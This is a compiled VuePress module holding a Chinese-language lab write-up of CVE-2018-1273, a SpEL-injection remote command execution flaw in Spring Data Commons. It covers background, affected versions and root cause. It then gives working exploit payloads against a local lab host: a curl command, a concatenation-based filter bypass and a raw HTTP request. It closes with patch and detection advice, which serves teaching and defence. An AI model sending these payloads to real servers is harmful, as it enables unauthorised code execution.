import{_ as o}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,b as t,a,d as i,e as r,r as p,o as l}from"./app-BZ3msaS8.js";const c="/DailyNotes/assets/img1-ScWHT7aN.png",g="/DailyNotes/assets/img4-Dnc7Q6BB.png",h="/DailyNotes/assets/img3-BU48n53y.png",d="/DailyNotes/assets/img2-xCR6VbbQ.png",m="/DailyNotes/assets/img7-76Kj664p.png",u="/DailyNotes/assets/img14-BoxMjhlF.png",f="/DailyNotes/assets/img15-sCJTYC1y.png",_={},x={href:"https://www.cnnvd.org.cn/home/globalSearch?keyword=CNNVD-201804-564",target:"_blank",rel:"noopener noreferrer"},b={href:"https://nvd.nist.gov/vuln/detail/CVE-2018-1273",target:"_blank",rel:"noopener noreferrer"};function y(S,e){const n=p("ExternalLinkIcon");return l(),s("div",null,[e[2]||(e[2]=t('<h1 id="命令执行-spring-cve-2018-1273-spring-data-commons-远程命令执行漏洞-利用方式二可绕过" tabindex="-1"><a class="header-anchor" href="#命令执行-spring-cve-2018-1273-spring-data-commons-远程命令执行漏洞-利用方式二可绕过"><span>命令执行_spring_CVE-2018-1273_Spring_Data_Commons 远程命令执行漏洞（利用方式二可绕过）</span></a></h1><h2 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h2><h2 id="漏洞介绍" tabindex="-1"><a class="header-anchor" href="#漏洞介绍"><span>漏洞介绍</span></a></h2>',3)),a("blockquote",null,[a("p",null,[a("a",x,[e[0]||(e[0]=i("国家信息安全漏洞库 (cnnvd.org.cn)",-1)),r(n)])]),a("p",null,[a("a",b,[e[1]||(e[1]=i("NVD (nist.gov)",-1)),r(n)])])]),e[3]||(e[3]=t('<hr><p><strong>Spring Data</strong>是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。<strong>Spring Data Commons</strong>是 Spring Data 下所有子项目共享的基础框架。</p><p>Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons 是 Spring Data 下所有子项目共享的基础框架。Spring Data Commons 在 2.0.5 及以前版本中，组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的 SPEL 表达式实现远程代码攻击，直接获取服务器控制权限。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>未经身份验证的远程恶意用户（或攻击者）可以针对 Spring Data REST 支持的 HTTP 资源提供特制的请求参数，或者使用 Spring Data 的基于投影的请求有效负载绑定可能导致远程执行代码攻击。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><ul><li>Spring Data Commons 1.13 to 1.13.10 (Ingalls SR10)</li><li>Spring Data REST 2.6 to 2.6.10 (Ingalls SR10)</li><li>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</li><li>Spring Data REST 3.0 to 3.0.5 (Kay SR5)</li><li>Older unsupported versions are also affected</li></ul><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h2><p>Spring Data Commons（1.13 至 1.13.10 之前的版本，2.0 至 2.0.5 的版本以及较旧的不受支持的版本）包含由于特殊元素的不正确中和而导致的属性绑定器漏洞。未经身份验证的远程恶意用户（或攻击者）可以针对 Spring Data REST 支持的 HTTP 资源提供特制的请求参数，或者使用 Spring Data 的基于投影的请求有效负载绑定可能导致远程执行代码攻击。</p><hr><h3 id="源码分析" tabindex="-1"><a class="header-anchor" href="#源码分析"><span>源码分析</span></a></h3><p>Spring 在自动解析用户的参数的时候采用了 SpelExpressionParser 来解析 propertyName，但是并没有对参数进行进行有效的校验，</p><figure><img src="'+c+'" alt="img1" tabindex="0" loading="lazy"><figcaption>img1</figcaption></figure><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h2><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><p>自建环境，见文件夹内的.jar 文件</p><hr><h3 id="利用方式-1" tabindex="-1"><a class="header-anchor" href="#利用方式-1"><span>利用方式 1</span></a></h3><hr><h4 id="利用思路" tabindex="-1"><a class="header-anchor" href="#利用思路"><span>利用思路</span></a></h4><p>利用 this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec()函数构造 payload 进行代码执行漏洞利用</p><hr><h4 id="漏洞利用-1" tabindex="-1"><a class="header-anchor" href="#漏洞利用-1"><span>漏洞利用</span></a></h4><p>1）访问 http://ip:8080/account</p><figure><img src="'+g+'" alt="img4" tabindex="0" loading="lazy"><figcaption>img4</figcaption></figure><ol start="2"><li>发送 payload：这里尝试了两种方法，建议采用第二种。</li></ol><ul><li>方法一：firefox 浏览器 F12 打开，选择 network，点击 reload 后得到请求包，再点击 resend 即可在浏览器上直接修改请求。如下</li></ul><figure><img src="'+h+`" alt="img3" tabindex="0" loading="lazy"><figcaption>img3</figcaption></figure><p>构造攻击数据，修改为 POST 请求，payload 部分填写如下：</p><pre><code>[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch aa.txt&quot;)]
</code></pre><ul><li>方法二：执行命令</li></ul><pre><code>curl -X POST http://192.168.1.189:8080/account -d &quot;name[#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;touch aa.txt&#39;)]=123&quot;
</code></pre><figure><img src="`+d+'" alt="img2" tabindex="0" loading="lazy"><figcaption>img2</figcaption></figure><p>3）攻击成功，结果如下：</p><figure><img src="'+m+`" alt="img7" tabindex="0" loading="lazy"><figcaption>img7</figcaption></figure><h3 id="利用方式-2-绕过" tabindex="-1"><a class="header-anchor" href="#利用方式-2-绕过"><span>利用方式 2(绕过)</span></a></h3><hr><h4 id="利用思路-1" tabindex="-1"><a class="header-anchor" href="#利用思路-1"><span>利用思路</span></a></h4><p>修改 payload 为如下形式：</p><pre><code>name[#this.getClass().forName(&#39;ja&#39;+&#39;va.l&#39;+&#39;ang.Run&#39;+&#39;time&#39;).getRuntime().exec(&#39;touch test22.txt&#39;)]=123
</code></pre><p>将原本的 payload 利用+拼接。</p><hr><h4 id="漏洞利用-2" tabindex="-1"><a class="header-anchor" href="#漏洞利用-2"><span>漏洞利用</span></a></h4><p>使用 hackbar 插件，发送如下，</p><figure><img src="`+u+`" alt="img14" tabindex="0" loading="lazy"><figcaption>img14</figcaption></figure><p>这里选择 hackbar 的原因是编码方式的问题，若使用 burpsuite，请求包如下：</p><pre><code>POST /account HTTP/1.1
Host: 192.168.1.189:8080
Connection: keep-alive
Content-Length: 150
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.189:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.189:8080/account
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

name%5B%23this.getClass%28%29.forName%28%27ja%27%2B%27va.l%27%2B%27ang.Run%27%2B%27time%27%29.getRuntime%28%29.exec%28%27touch+test22.txt%27%29%5D=123
</code></pre><p>攻击成功，结果如下：</p><figure><img src="`+f+`" alt="img15" tabindex="0" loading="lazy"><figcaption>img15</figcaption></figure><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><hr><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议"><span>用户处置建议</span></a></h3><p>升级框架到最新版本。将 Spring Data Commons 框架的版本由 2.0.x 升级到 2.0.6，1.13.x 的用户升级到 1.13.11。</p><hr><h3 id="产品检测建议" tabindex="-1"><a class="header-anchor" href="#产品检测建议"><span>产品检测建议</span></a></h3><p>可针对[#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec()的命令及其拼接的形式进行检测。</p><hr><h1 id="附录" tabindex="-1"><a class="header-anchor" href="#附录"><span>附录</span></a></h1><h2 id="靶场搭建方法" tabindex="-1"><a class="header-anchor" href="#靶场搭建方法"><span>靶场搭建方法</span></a></h2><p>代码下载：https://github.com/wearearima/poc-cve-2018-1273</p><p>编译后打成 jar 包（见 poc 文件夹）</p><pre><code>cd ./poc
java -jar poc-cve-2018-1273-0.0.1-SNAPSHOT.jar
</code></pre>`,68))])}const v=o(_,[["render",y]]),N=JSON.parse('{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/spring/spring_CVE-2018-1273_bypass.html","title":"命令执行_spring_CVE-2018-1273_Spring_Data_Commons 远程命令执行漏洞（利用方式二可绕过）","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"漏洞分析","description":"命令执行_spring_CVE-2018-1273_Spring_Data_Commons 远程命令执行漏洞（利用方式二可绕过） 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) NVD (nist.gov) Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。Spring Data...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/spring/spring_CVE-2018-1273_bypass.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"命令执行_spring_CVE-2018-1273_Spring_Data_Commons 远程命令执行漏洞（利用方式二可绕过）"}],["meta",{"property":"og:description","content":"命令执行_spring_CVE-2018-1273_Spring_Data_Commons 远程命令执行漏洞（利用方式二可绕过） 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) NVD (nist.gov) Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。Spring Data..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"漏洞分析"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"命令执行_spring_CVE-2018-1273_Spring_Data_Commons 远程命令执行漏洞（利用方式二可绕过）\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"","slug":"","link":"#","children":[]},{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[{"level":3,"title":"源码分析","slug":"源码分析","link":"#源码分析","children":[]}]},{"level":2,"title":"漏洞利用","slug":"漏洞利用","link":"#漏洞利用","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方式 1","slug":"利用方式-1","link":"#利用方式-1","children":[]},{"level":3,"title":"利用方式 2(绕过)","slug":"利用方式-2-绕过","link":"#利用方式-2-绕过","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[{"level":3,"title":"用户处置建议","slug":"用户处置建议","link":"#用户处置建议","children":[]},{"level":3,"title":"产品检测建议","slug":"产品检测建议","link":"#产品检测建议","children":[]}]},{"level":2,"title":"靶场搭建方法","slug":"靶场搭建方法","link":"#靶场搭建方法","children":[]}],"git":{"createdTime":1731665131000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":3}]},"readingTime":{"minutes":3.42,"words":1027},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/spring/spring_CVE-2018-1273_bypass.md","localizedDate":"2024年11月15日","excerpt":"\\n<h2></h2>\\n","autoDesc":true}');export{v as comp,N as data};
